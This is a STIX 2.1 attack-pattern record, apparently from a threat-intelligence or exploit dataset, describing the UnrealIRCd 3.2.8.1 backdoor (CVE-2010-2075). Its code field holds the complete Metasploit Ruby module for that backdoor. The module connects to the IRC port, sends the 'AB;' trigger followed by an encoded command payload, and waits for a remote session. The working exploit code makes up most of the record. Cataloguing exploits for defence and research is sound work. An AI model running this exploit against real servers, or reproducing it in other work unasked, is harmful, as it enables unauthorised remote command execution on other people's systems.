{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--736540d6-c1df-4067-a5a9-f100465f104e",
    "created": "2024-08-14T17:14:14.033235Z",
    "modified": "2024-08-14T17:14:14.033239Z",
    "name": "UnrealIRCD 3.2.8.1 Backdoor Command Execution",
    "description": " This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/irc/unreal_ircd_3281_backdoor.rb",
            "external_id": "unreal_ircd_3281_backdoor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2075"
        },
        {
            "source_name": "reference",
            "url": "http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'UnrealIRCD 3.2.8.1 Backdoor Command Execution',\n      'Description'    => %q{\n          This module exploits a malicious backdoor that was added to the\n        Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the\n        Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-2075' ],\n          [ 'OSVDB', '65445' ],\n          [ 'URL', 'http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2010-06-12'))\n\n    register_options(\n      [\n        Opt::RPORT(6667)\n      ])\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Connected to #{rhost}:#{rport}...\")\n    banner = sock.get_once(-1, 30)\n    banner.to_s.split(\"\\n\").each do |line|\n      print_line(\"    #{line}\")\n    end\n\n    print_status(\"Sending backdoor command...\")\n    sock.put(\"AB;\" + payload.encoded + \"\\n\")\n\n    # Wait for the request to be handled\n    1.upto(120) do\n      break if session_created?\n      select(nil, nil, nil, 0.25)\n      handler()\n    end\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-06-12",
    "x_mitre_platforms": [
        "['unix']"
    ]
}